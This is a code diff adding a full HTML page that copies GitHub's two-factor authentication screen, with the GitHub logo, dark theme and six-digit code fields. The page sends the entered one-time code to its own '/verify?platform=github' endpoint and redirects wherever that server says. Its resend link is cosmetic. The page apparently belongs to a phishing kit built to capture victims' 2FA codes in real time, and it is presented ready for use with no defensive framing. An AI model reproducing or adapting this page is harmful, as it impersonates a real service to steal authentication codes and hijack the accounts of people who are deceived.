@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two-factor authentication · GitHub</title>
+    <style>
+        :root {
+            --github-dark: #0D1117;
+            --github-button: #238636;
+            --github-button-hover: #2EA043;
+            --text-color: #C9D1D9;
+            --secondary-text: #8B949E;
+            --border-color: #30363D;
+            --input-bg: #0D1117;
+            --header-bg: #161B22;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background: var(--github-dark);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
+        .header {
+            background: var(--header-bg);
+            padding: 16px 0;
+            margin-bottom: 32px;
+        }
+
+        .header-content {
+            max-width: 1012px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .github-logo svg {
+            width: 32px;
+            height: 32px;
+            fill: var(--text-color);
+        }
+
+        .container {
+            max-width: 340px;
+            margin: 0 auto;
+            padding: 24px 16px;
+        }
+
+        .verification-box {
+            background: var(--header-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 24px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 300;
+            margin-bottom: 16px;
+            text-align: center;
+            color: var(--text-color);
+        }
+
+        p {
+            color: var(--secondary-text);
+            margin-bottom: 24px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+
+        .otp-input {
+            width: 40px;
+            height: 32px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            background: var(--input-bg);
+            color: var(--text-color);
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #58A6FF;
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
+        }
+
+        button {
+            background: var(--github-button);
+            color: white;
+            border: 1px solid rgba(240, 246, 252, 0.1);
+            border-radius: 6px;
+            padding: 5px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            height: 32px;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background: var(--github-button-hover);
+        }
+
+        .resend {
+            text-align: center;
+            font-size: 12px;
+            color: var(--secondary-text);
+        }
+
+        .resend a {
+            color: #58A6FF;
+            text-decoration: none;
+        }
+
+        .resend a:hover {
+            text-decoration: underline;
+        }
+
+        #timer {
+            color: var(--secondary-text);
+            font-size: 12px;
+        }
+
+        #combinedOTP {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <div class="github-logo">
+                <svg aria-hidden="true" viewBox="0 0 16 16" version="1.1">
+                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                </svg>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="verification-box">
+            <h1>Two-factor authentication</h1>
+            <p>Enter the authentication code sent to your email to verify your identity.</p>
+            
+            <form action="/verify?platform=github" method="POST" id="otpForm">
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                </div>
+                <input type="hidden" id="combinedOTP" name="otp">
+                <button type="submit">Verify</button>
+            </form>
+            
+            <div class="resend">
+                <span id="timer">Resend code in: 30s</span><br>
+                <a href="#" id="resendLink" style="display: none;">Resend new code</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Handle OTP input
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const combinedOTP = document.getElementById('combinedOTP');
+        const form = document.getElementById('otpForm');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+            combinedOTP.value = otp;
+            
+            // Submit form and handle response
+            fetch('/verify?platform=github', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({ otp: otp })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.status === 'success' && data.redirect_url) {
+                    window.location.href = data.redirect_url;
+                } else {
+                    throw new Error(data.error || 'Unknown error occurred');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+
+        // Timer functionality
+        let timeLeft = 30;
+        const timerElement = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
+
+        const updateTimer = () => {
+            if (timeLeft > 0) {
+                timerElement.textContent = `Resend code in: ${timeLeft}s`;
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.style.display = 'none';
+                resendLink.style.display = 'inline';
+            }
+        };
+
+        updateTimer();
+
+        resendLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            timeLeft = 30;
+            timerElement.style.display = 'inline';
+            resendLink.style.display = 'none';
+            updateTimer();
+        });
+    </script>
+</body>
+</html> 
